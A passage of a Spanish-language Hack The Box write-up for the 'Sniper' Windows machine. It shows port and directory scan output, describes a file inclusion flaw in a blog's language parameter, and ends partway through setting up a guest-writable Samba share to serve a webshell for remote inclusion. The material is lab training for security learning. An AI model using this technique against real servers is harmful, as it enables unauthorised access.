Q+ZBs33XKI13Ey5cZMRP4joNumuixCGHyc6QboBsKVTJRKEq+i1ko8PRal6lTfDxPommiUkMIKSVMmwyTJsJLeyHdCcGYg2+69LgJuhtn8OFVUPlRCnovki+RZQhKYNhl4s05dCExNcWhQ4q/vycxzZvnwQCZM0ytwfUMjvSZzP3BRhrm38+gWcX+Gy30jcS5NljkzaGQbRN0tt93gmi5hAxAhYBUoEB64CtFKgnfWWiC0JBSjRqEfIVGg42OtnAr+xt/Qt/JUSJRA1X2KA333lzF1zk8GvDzeDvSAxmOC0BJMIHPB6ezbW+CR1NZ1s5TaHDJkK7/GVXW8hteLaf95Vy7kAHfpcjt10SAYfKjaR+TCPMUyzehKrz5IyFQ8HrHStwZk9BH/4qGouz5R7Wo9PZdvVK6njLK6GeO3FwNBaYFugXCAGUyqTLD2sb9+C5oAeghGBJMCXZ0EVZ8B0/MWEpV9hqzGw1CP3CDQvkfhnjq/Nn0rpnvPv5g4pmBA8fZlZ2Fqqxn4uAJbDtGLBYjEk2yqDZDrryCAU/HyRcpOkUcp8hYYQwpbTY89E2avR7WxU/Q0mByOu3sXtjZccwAaKuTfzEtHt++RiTTb7/NIfk9ai9+SHN9DfX1ddTF6qgtN3Kq74cgoL8/QyaTob8/Q29vP4WRLKn68xw9/hk/XQ1NNaZT7C39Tewk1ADN2txxsjhcfKGmxuKV746wamgfvtLAjKGMCFKzUEIgcBHKxdQDLCMkaimiEZBC44NPDrB1RZ6mOgtvqLQj/uPOE4A2nmbCfqr9927WebmlOcIfN/g80FJkYHCIkUKRUlkRonNP2wymz5yNFCZeAHnHg7DEE4s0dq2TtE60cLPOzuiT6VfHE80YFwiQatOZHd6fZ+eb6u2XNi4kUtOeww0L3GtdIyhOIHojiq7rNJf/R+j2kogVsFsDXlwfB6VG3f7CjtiW9j98XWSOlwKU/8b01ceuauvua7M3JaoNC0D6IZ4XABCNGgg0MDU+OV7sbq6QH0+rDfeITedO3Q7/OsF4SaUQwZ5716iItV6YxmKp0SqESCiFRKmcJtUF/PBTwxt7U2z+qvPW3B2s/wO2tR0TGJnsDwAAAABJRU5ErkJggg==&#34; alt=&#34;box_img_maker&#34; /&gt;&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;OS&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;Windows&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Puntos&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;30&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Dificultad&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;Media&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;IP&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;10.10.10.151&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Maker&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;&lt;span&gt;&lt;p class=&#34;user_maker&#34; style=&#34;margin: auto;margin-bottom: 5px;&#34;&gt; &lt;a href=&#34;https://www.hackthebox.eu/home/users/profile/8308&#34;&gt;MinatoTW&lt;/a&gt;&lt;img src=&#34;https://www.hackthebox.eu/badge/image/8308&#34; class=&#34;img_user_maker&#34;/&gt; &lt;/p&gt; &lt;hr style=&#34;opacity:25%;&#34;&gt; &lt;p class=&#34;user_maker&#34; style=&#34;margin: auto;margin-top: -15px;margin-bottom: 5px;&#34;&gt; &lt;a href=&#34;https://www.hackthebox.eu/home/users/profile/27390&#34;&gt;felamos&lt;/a&gt;&lt;img src=&#34;https://www.hackthebox.eu/badge/image/27390&#34; class=&#34;img_user_maker&#34;/&gt; &lt;/p&gt;&lt;/span&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;
&lt;a href=&#34;#single__title&#34; class=&#34;button&#34; style=&#34;width: 72px; height: 30px; pointer-events: none;&#34;  data-color=&#34;default&#34; target=&#34;_blank&#34; rel=&#34;noreferrer&#34;&gt;
  &lt;span class=&#34;button__text&#34;&gt;
    Matrix
  &lt;/span&gt;
&lt;/a&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;&lt;div class=&#34;box&#34;&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-chart&#34; data-lang=&#34;chart&#34;&gt;{
   &amp;quot;type&amp;quot;:&amp;quot;radar&amp;quot;,
   &amp;quot;data&amp;quot;:{
      &amp;quot;labels&amp;quot;:[&amp;quot;Enumeration&amp;quot;,&amp;quot;Real-Life&amp;quot;,&amp;quot;CVE&amp;quot;,&amp;quot;Custom Explotation&amp;quot;,&amp;quot;CTF-Like&amp;quot;],
      &amp;quot;datasets&amp;quot;:[
         {
            &amp;quot;label&amp;quot;:&amp;quot;User Rate&amp;quot;,  &amp;quot;data&amp;quot;:[7.5, 7.8, 5.4, 4.6, 2.2],
            &amp;quot;backgroundColor&amp;quot;:&amp;quot;rgba(75, 162, 189,0.5)&amp;quot;,
            &amp;quot;borderColor&amp;quot;:&amp;quot;#4ba2bd&amp;quot;
         },
         { 
            &amp;quot;label&amp;quot;:&amp;quot;Maker Rate&amp;quot;,
            &amp;quot;data&amp;quot;:[8, 9, 2, 8, 1],
            &amp;quot;backgroundColor&amp;quot;:&amp;quot;rgba(154, 204, 20,0.5)&amp;quot;,
            &amp;quot;borderColor&amp;quot;:&amp;quot;#9acc14&amp;quot;
         }
      ]
   },
    &amp;quot;options&amp;quot;: {&amp;quot;scale&amp;quot;: {&amp;quot;ticks&amp;quot;: {&amp;quot;backdropColor&amp;quot;:&amp;quot;rgba(0,0,0,0)&amp;quot;},
            &amp;quot;angleLines&amp;quot;:{&amp;quot;color&amp;quot;:&amp;quot;rgba(255, 255, 255,0.6)&amp;quot;},
            &amp;quot;gridLines&amp;quot;:{&amp;quot;color&amp;quot;:&amp;quot;rgba(255, 255, 255,0.6)&amp;quot;}
        }
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h1 id=&#34;masscan--nmap&#34;&gt;MASSCAN &amp;amp; NMAP&lt;/h1&gt;
&lt;p&gt;Escaneo de puertos tcp/udp y servicios con masscan y nmap.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;Starting masscan 1.0.5 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;http://bit.ly/14GZzcT&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; at 2020-01-15 18:34:38 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; hosts &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;131070&lt;/span&gt; ports/host&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
Discovered open port 80/tcp on 10.10.10.151                                    
Discovered open port 135/tcp on 10.10.10.151                                   
Discovered open port 49667/tcp on 10.10.10.151                                 
Discovered open port 139/tcp on 10.10.10.151

&lt;span class=&#34;c1&#34;&gt;# Nmap 7.80 scan initiated Wed Jan 15 12:30:50 2020 as: nmap -p- --min-rate 1000 -sV -sC -o nmap_scan 10.10.10.151&lt;/span&gt;
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 10.10.10.151
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.24s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Not shown: &lt;span class=&#34;m&#34;&gt;65530&lt;/span&gt; filtered ports
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-server-header: Microsoft-IIS/10.0
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-title: Sniper Co.
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
49667/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; CPE: cpe:/o:microsoft:windows

Host script results:
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_clock-skew: 8h01m11s
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; smb2-security-mode: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   2.02: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_    Message signing enabled but not required
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; smb2-time: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   date: 2020-01-16T02:36:27
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
&lt;span class=&#34;c1&#34;&gt;# Nmap done at Wed Jan 15 12:35:53 2020 -- 1 IP address (1 host up) scanned in 303.66 seconds&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h1 id=&#34;http&#34;&gt;HTTP&lt;/h1&gt;
&lt;p&gt;En el puerto 80 corriendo IIS con una pagina web.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/sniper/Screenshot_20200115_124016.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;gobuster&#34;&gt;GOBUSTER&lt;/h2&gt;
&lt;p&gt;Escaneo de directorios y archivos con gobuster.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@aoiri:~/htb/sniper# gobuster dir -u http://10.10.10.151/ -w /usr/share/wordlists/dirb/common.txt -t &lt;span class=&#34;m&#34;&gt;15&lt;/span&gt; -x asp,aspx,php,html,txt -q
/Blog &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/blog &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/css &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/images &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/Images &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/index.php &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/Index.php &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/index.php &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/js &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/user &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;blog&#34;&gt;/blog/&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@aoiri:~/htb/sniper# gobuster dir -u http://10.10.10.151/blog/ -w /usr/share/wordlists/dirb/common.txt -t &lt;span class=&#34;m&#34;&gt;15&lt;/span&gt; -x asp,aspx,php,html,txt -q
/css &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/error.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/header.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/Index.php &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/index.php &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/index.php &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/js &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: &lt;span class=&#34;m&#34;&gt;301&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;user&#34;&gt;/user/&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@aoiri:~/htb/sniper# gobuster dir -u http://10.10.10.151/user/ -w /usr/share/wordlists/dirb/common.txt -t &lt;span class=&#34;m&#34;&gt;15&lt;/span&gt; -x asp,aspx,php,html,txt -q
/auth.php &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 302&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/css &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/db.php &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/DB.php &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/fonts &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/Images &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/images &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/index.php &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 302&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/Index.php &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 302&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/index.php &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 302&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/js &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/login.php &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/Login.php &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/logout.php &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 302&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/registration.php &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/vendor &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Encontramos dos rutas distintas donde estan almacenadas dos paginas diferentes, una donde se muestra un panel de inicio de sesion y la otra nos muestra una pagina con algunos articulos.&lt;/p&gt;
&lt;h3 id=&#34;user-1&#34;&gt;/user/&lt;/h3&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/sniper/Screenshot_20200116_200212.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;blog-1&#34;&gt;/blog/&lt;/h3&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/sniper/Screenshot_20200116_200252.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h1 id=&#34;lfi-rfi---shell-iusr&#34;&gt;LFI-RFI -&amp;gt; Shell IUSR&lt;/h1&gt;
&lt;p&gt;En la pagina de &lt;code&gt;/blog/&lt;/code&gt; encontramos que, al cambiar de idioma se le pasa como parametro un archivo existente a lang, a la pagina.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/sniper/Screenshot_20200116_200420.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Al realizar una consulta/archivo que no exista en la maquina nos muestra un mensaje de error, esto quiere decir que debe de existir el archivo en la maquina.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/sniper/Screenshot_20200116_200840.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Intentamos todos los payloads que pudiesen afectar a esta vulnerabilidad pero ninguno funciono, por lo que para explotar esta vulnerabilidad utilizamos un servidor SAMBA para pasarle como parametro una webshell desde nuestra maquina.&lt;/p&gt;
&lt;p&gt;Configuracion de Servidor SAMBA:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;apt-get install samba
mkdir /var/www/html/pub/ 
chmod &lt;span class=&#34;m&#34;&gt;0555&lt;/span&gt; /var/www/html/pub/
chown -R nobody:nogroup /var/www/html/pub/
touch &amp;gt; /etc/samba/smb.conf
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;/etc/samba/smb.conf:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;global&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;span class=&#34;nv&#34;&gt;workgroup&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; WORKGROUP
server &lt;span class=&#34;nv&#34;&gt;string&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; Samba Server %v
netbios &lt;span class=&#34;nv&#34;&gt;name&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; indishell-lab
&lt;span class=&#34;nv&#34;&gt;security&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; user
map to &lt;span class=&#34;nv&#34;&gt;guest&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; bad user
name resolve &lt;span class=&#34;nv&#34;&gt;order&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; bcast host
dns &lt;span class=&#34;nv&#34;&gt;proxy&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; no
&lt;span class=&#34;nb&#34;&gt;bind&lt;/span&gt; interfaces &lt;span class=&#34;nv&#34;&gt;only&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; yes

&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;test&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;span class=&#34;nv&#34;&gt;path&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; /var/www/html/pub
&lt;span class=&#34;nv&#34;&gt;writable&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; yes
guest &lt;span class=&#34;nv&#34;&gt;ok&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; yes
